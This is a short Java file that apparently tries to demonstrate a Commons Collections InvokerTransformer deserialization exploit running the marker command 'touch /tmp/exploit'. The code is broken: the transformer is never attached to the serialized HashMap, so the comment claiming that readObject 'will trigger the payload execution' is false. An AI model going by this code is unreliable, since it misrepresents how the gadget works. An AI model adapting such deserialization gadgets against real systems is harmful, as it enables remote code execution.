import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InvokerTransformer;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.HashMap;
import java.util.Map;

public class TestInvokerTransformer {

    public static void main(String[] args) throws Exception {
        Transformer transformerChain = new InvokerTransformer(
                "exec", 
                new Class[]{String.class}, 
                new Object[]{"touch /tmp/exploit"}
        );

        Map<String, String> map = new HashMap<>();
        map.put("foo", "bar");

        // Serialize the vulnerable object
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(map);
        oos.close();

        // Deserialize the vulnerable object
        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject(); // This will trigger the payload execution
        ois.close();
    }
}